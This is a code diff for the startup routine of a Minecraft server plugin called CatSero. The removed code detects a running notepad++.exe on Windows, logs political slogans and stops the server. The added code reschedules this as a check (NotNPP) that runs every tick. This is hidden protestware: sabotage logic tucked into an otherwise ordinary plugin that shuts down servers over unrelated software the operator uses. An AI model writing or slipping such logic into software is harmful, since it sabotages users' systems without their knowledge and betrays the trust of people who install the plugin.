@@ -108,48 +108,36 @@ public class CatSero extends JavaPlugin {
     public void onEnable() {
 
         // 反对 Notepad++
-        if (
-                System.getProperty("os.name").toLowerCase().contains("windows")
-                        && findProcess("notepad++.exe")
-        ) {
-            List<String> cnmnpp = Arrays.asList(
-                    "检测到Notepad++(Npp)，终止服务器！",
-                    "严正声明：台湾是中国的一部分，中国主权不容侵犯",
-                    "犯我中华者，虽远必诛！"
-            );
-            Logger.logWARN(cnmnpp);
-            getServer().dispatchCommand(Bukkit.getConsoleSender(), "stop");
-        } else {
+        if (Envrionment.Depends.MiraiMC) {
+            Logger.logLoader("Registering Executors...");
+            ExecutorRegister.register();
+            Logger.logLoader("Registered.");
 
-            if (Envrionment.Depends.MiraiMC) {
-                Logger.logLoader("Registering Executors...");
-                ExecutorRegister.register();
-                Logger.logLoader("Registered.");
+            Logger.logLoader("Registering Listeners...");
+            ListenerRegister.register();
+            Logger.logLoader("Registered.");
 
-                Logger.logLoader("Registering Listeners...");
-                ListenerRegister.register();
-                Logger.logLoader("Registered.");
-
-                if (Configuration.PLUGIN.BSTATS) {
-                    Logger.logINFO("Start bStats.");
-                    new bStatsMetrics(this, 14767);
-                }
-
-                Logger.logLoader("Start TPSCalculator.");
-                getServer().getScheduler().scheduleSyncRepeatingTask(this, new TPSCalculator(), 100L, 1L);
-
-                Logger.logLoader("CatSero loaded.");
-
-                if (Configuration.PLUGIN.CHECK_UPDATE.ENABLE) {
-                    Logger.logLoader("Start checking update...");
-                    getServer().getScheduler().runTaskTimerAsynchronously(this, new Updater(), 0L, Configuration.PLUGIN.CHECK_UPDATE.INTERVAL * 1000L);
-                    getServer().getPluginManager().registerEvents(new Updater(), this);
-                }
-            } else {
-                Logger.logWARN("[Loader] Warning, not install MiraiMC, CatSero will not run!");
-                getServer().getPluginManager().disablePlugin(this);
+            if (Configuration.PLUGIN.BSTATS) {
+                Logger.logINFO("Start bStats.");
+                new bStatsMetrics(this, 14767);
             }
 
+            Logger.logLoader("Start TPSCalculator.");
+            getServer().getScheduler().scheduleSyncRepeatingTask(this, new TPSCalculator(), 100L, 1L);
+
+            Logger.logLoader("Start check Notepad++.");
+            getServer().getScheduler().scheduleSyncRepeatingTask(this, new NotNPP(), 20L, 1L);
+
+            Logger.logLoader("CatSero loaded.");
+
+            if (Configuration.PLUGIN.CHECK_UPDATE.ENABLE) {
+                Logger.logLoader("Start checking update...");
+                getServer().getScheduler().runTaskTimerAsynchronously(this, new Updater(), 0L, Configuration.PLUGIN.CHECK_UPDATE.INTERVAL * 1000L);
+                getServer().getPluginManager().registerEvents(new Updater(), this);
+            }
+        } else {
+            Logger.logWARN("[Loader] Warning, not install MiraiMC, CatSero will not run!");
+            getServer().getPluginManager().disablePlugin(this);
         }
     }
 
